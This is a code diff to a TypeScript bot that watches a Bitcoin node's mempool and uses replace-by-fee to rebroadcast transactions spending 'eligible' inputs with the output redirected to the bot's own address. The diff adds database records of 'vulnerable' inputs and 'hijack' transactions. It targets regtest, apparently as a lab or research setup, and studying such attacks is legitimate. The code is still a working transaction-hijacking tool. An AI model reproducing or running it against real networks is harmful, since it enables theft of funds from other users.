@@ -1,10 +1,15 @@
-import { Transaction, TxOutput as Output } from "bitcoinjs-lib";
+import { Transaction, TxOutput as Output, TxInput } from "bitcoinjs-lib";
 import BitcoinClient from "./bitcoin-client";
 import * as bitcoinjs from "bitcoinjs-lib";
 import { getEligibleInputs } from "./utils";
 import logger from "./logger";
 import { MempoolEntry, Txout } from "./bitcoin-client/module";
+import createDb from "./create-db";
+import DB from "./db";
 const zmq = require("zeromq");
+
+createDb();
+const db = new DB();
 
 const ZEROMQ_PORT = 8089;
 const NETWORK = bitcoinjs.networks.regtest;
@@ -13,6 +18,8 @@ const NETWORK = bitcoinjs.networks.regtest;
 const client = new BitcoinClient();
 
 export async function tryToRbf(tx: Transaction) {
+  // Only need to check first output since our own
+  // capture txs never have more than one output
   let outputAddress = bitcoinjs.address.fromOutputScript(
     tx.outs[0].script,
     NETWORK
@@ -24,7 +31,7 @@ export async function tryToRbf(tx: Transaction) {
     return;
   }
 
-  let eligibleInputs = await getEligibleInputs(tx);
+  let eligibleInputs: TxInput[] = await getEligibleInputs(tx);
 
   if (eligibleInputs.length === 0) {
     logger.debug(`No eligible inputs, skipping tx ${tx.getId()}`);
@@ -37,8 +44,12 @@ export async function tryToRbf(tx: Transaction) {
   let txoutPromises: Promise<Txout>[] = eligibleInputs.map(async (txin) => {
     let txid = Buffer.from(txin.hash).reverse().toString("hex");
     let rawTx = await client.getRawTransaction(txid);
+    let value = rawTx.vout[txin.index].value;
+
+    await db.storeVulnerableInput(txid, txin.index, value, tx.getId());
+
     return {
-      value: rawTx.vout[txin.index].value,
+      value,
     };
   });
 
@@ -58,6 +69,17 @@ export async function tryToRbf(tx: Transaction) {
     logger.debug(`Transaction ${tx.getId()} no longer in mempool, skipping...`);
     return;
   }
+
+  let outputValue = tx.outs.reduce((sum, val) => {
+    return sum + Number(val.value);
+  }, 0);
+
+  await db.storeVulnerableTransaction(
+    tx.getId(),
+    outputValue,
+    mempoolTx.vsize,
+    mempoolTx.fees.base * 100_000_000
+  );
 
   let mempoolInfo = await client.getMempoolInfo();
 
@@ -82,17 +104,26 @@ export async function tryToRbf(tx: Transaction) {
   tx.outs = [
     {
       // Subtracting from existing output will implicitly include old fee
-      value: totalOutputValueInSatoshis - BigInt(minimumFeeBumpInSatoshis),
+      value: totalOutputValueInSatoshis - BigInt(totalFeeInSatoshis),
       script: bitcoinjs.address.toOutputScript(address, NETWORK),
     },
   ];
 
   logger.debug(`Sending raw transaction: ${tx.toHex()}`);
   let txid = await client.sendRawTransaction(tx.toHex());
+
+  await db.storeHijackTransaction(
+    txid,
+    totalOutputValueInSatoshis - BigInt(totalFeeInSatoshis),
+    tx.virtualSize(),
+    totalFeeInSatoshis,
+    eligibleInputs
+  );
+
   logger.debug(`Successfully submitted transaction ${txid}`);
 }
 
-async function listenForMempoolTransactions() {
+async function main() {
   const sock = new zmq.Subscriber();
 
   sock.connect(`tcp://127.0.0.1:${ZEROMQ_PORT}`);
@@ -119,4 +150,4 @@ async function listenForMempoolTransactions() {
   }
 }
 
-listenForMempoolTransactions();
+main();
